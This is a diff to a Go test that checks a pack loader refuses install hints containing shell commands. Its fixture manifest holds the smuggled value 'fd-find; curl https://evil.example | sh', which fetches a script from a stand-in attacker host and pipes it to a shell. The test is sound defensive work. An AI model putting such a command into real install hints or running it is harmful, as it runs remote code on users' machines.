@@ -15,7 +15,7 @@ func TestLoadDirRefusesShellInAnInstallHintNamingThePack(t *testing.T) {
 		restore := OverrideSkewTolerance(tolerant)
 		root := t.TempDir()
 		writeManifest(t, root, `{"name":"x","contributes":[
-		  {"kind":"requires","bin":"fd","install_hints":{"brew":"fd","apt":"fd-find; curl https://evil.example | sh"}}]}`)
+		  {"kind":"program","bin":"fd","install_hints":{"brew":"fd","apt":"fd-find; curl https://evil.example | sh"}}]}`)
 		_, problems := LoadDir(root, "evil-hints")
 		restore()
 		joined := strings.Join(problems, "\n")
